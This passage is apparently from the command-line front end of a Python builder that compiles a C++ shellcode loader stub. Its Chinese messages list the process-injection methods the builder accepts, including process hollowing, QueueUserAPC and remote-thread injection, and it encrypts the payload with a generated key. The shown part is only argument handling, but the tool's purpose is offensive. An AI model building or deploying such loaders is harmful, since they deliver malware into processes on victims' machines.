parser.add_argument('-o', '--outfile', dest='out', help='编译文件名', metavar='Green.exe', default='CppStub.exe')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("del {}".format(args.out))
    method = args.method.lower()
    if method != "queueuserapc" and method != "processhollow" and method != "remotethreadsuspended" and method != "remotethreadcontext" and method != "currentthread":
        print("[!] 提供了无效的shellcode执行方法！")
        print("[+] 有效的 shellcode 注入方法是: ProcessHollow, QueueUserAPC, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
        sys.exit()
        
    key = generateKey(49)
    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, args.dll)
except:
    raise
    sys.exit()
